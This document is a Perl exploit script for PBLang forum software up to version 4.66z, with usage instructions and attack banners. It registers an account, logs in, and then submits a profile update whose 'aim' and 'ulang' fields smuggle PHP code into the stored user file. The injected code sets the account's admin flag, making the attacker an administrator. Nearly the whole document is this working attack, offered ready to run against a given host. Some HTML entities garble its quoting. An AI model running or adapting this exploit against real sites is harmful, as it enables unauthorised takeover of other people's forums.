PBlang <= 4.66z Remote Create Admin Exploit
===========================================



#!/usr/bin/perl
# PBlang 4.66z Create Admin Exploit
# this exploit *register* a user with admin access

use IO::Socket;
use LWP::UserAgent;
use HTTP::Cookies;


 $host = $ARGV[0];
 $uname = $ARGV[1];
 $passwd = $ARGV[2];
 $url = "http://".$host;

 print q(
 ###########################################################
 #            PBLANG 4.66z Create Admin Exploit            #
 ################# (C)oded By Hessam-x #####################

);



 if (@ARGV < 3) {
 print " #  usage : xpl.pl [host&path] [uname] [pass]\n";
 exit();
 }

   print " [~] User/Password : $uname/$passwd \n";
   print " [~] Host : $host \n";

 $evilcode  = " \$userlocation=\"hell\"; \$userjoined=\"1174733561\"; \$userhomepage=\"http://\";";
 $evilcode .= " \$useradmin=\"1\"; \$usermod=\"0\"; \$userban=\"0\"; \$userlastvisit=\"1174733561\";";

 $xpl = LWP::UserAgent->new() or die;
 $cookie_jar = HTTP::Cookies->new();

 $xpl->cookie_jar( $cookie_jar );

   #register
 $reg = $xpl->post($url.&#039;register.php?reg=2&#039;,
 Content => [
 "user" => $uname,
 "pass" => $passwd,
 "pass2" => $passwd,
 "em" => &#039;evil@hell.com&#039;,
 "realname" => &#039;evilcode&#039;,
 "alias" => $uname,
 "msn" => &#039;evilcode&#039;,
 "icq" => &#039;evilcode&#039;,
 "aim" => &#039;evilcode&#039;,
 "yahoo" => &#039;evilcode&#039;,
 "qq" => &#039;evilcode&#039;,
 "web" => &#039;http://&#039;,
 "loc" => &#039;hell&#039;,
 "pt" => &#039;PBLang&#039;,
 "av" => &#039;none&#039;,
 "webav" =>&#039;&#039;,
 "sig" => &#039;be Safe&#039;,
 "regcode" => &#039;9999999999&#039;,
 "lang" => &#039;en&#039;,
 "accept" => &#039;1&#039;,
 "Submit" => &#039;Submit&#039;,
 ],);
   print " [~] registered ... \n";

$login = $xpl->post($url.&#039;login.php?id=2&#039;,
Content => [
&#039;user&#039; => $uname,
&#039;pass&#039; => $passwd,
&#039;Submit&#039; => &#039;submit&#039;,
],);
$setcookie = $xpl->post($url.&#039;setcookie.php?u=&#039;.$uname);
 if($cookie_jar->as_string =~ /$uname/) {
   print " [~] Logined ... \n";
 } else {
 print " [-] Can not Login In $host !\n";
 exit();
 }
 $ecode = $xpl->post($url.&#039;ucp.php?id=2&user=&#039;.$uname,
 Content => [
 "npass" => $passwd,
 "npass2" => $passwd,
 "oldpass" => $passwd,
 "emhide" => &#039;hide&#039;,
 "user" => $uname,
 "em" => &#039;evil@hell.com&#039;,
 "realname" => &#039;evilcode&#039;,
 "alias" => $uname,
 "msn" => &#039;evilcode&#039;,
 "icq" => &#039;evilcode&#039;,
 "aim" => &#039;evilcode\";&#039;.$evilcode,
 "yah" => &#039;evilcode&#039;,
 "qq" => &#039;evilcode&#039;,
 "web" => &#039;http://&#039;,
 "loc" => &#039;hell&#039;,
 "pt" => &#039;PBLang&#039;,
 "av" => &#039;none&#039;,
 "webav" =>&#039;&#039;,
 "sig" => &#039;&#039;,
 "regcode" => &#039;1174733482&#039;,
 "ulang" => &#039;*/ \$userlang=\"en\"; //&#039;,
 "accept" => &#039;1&#039;,
 "Submit2" => &#039;Submit&#039;,
 ],);


print " [+] You Are Admin Now !!";
print "\n #################################################### \n";



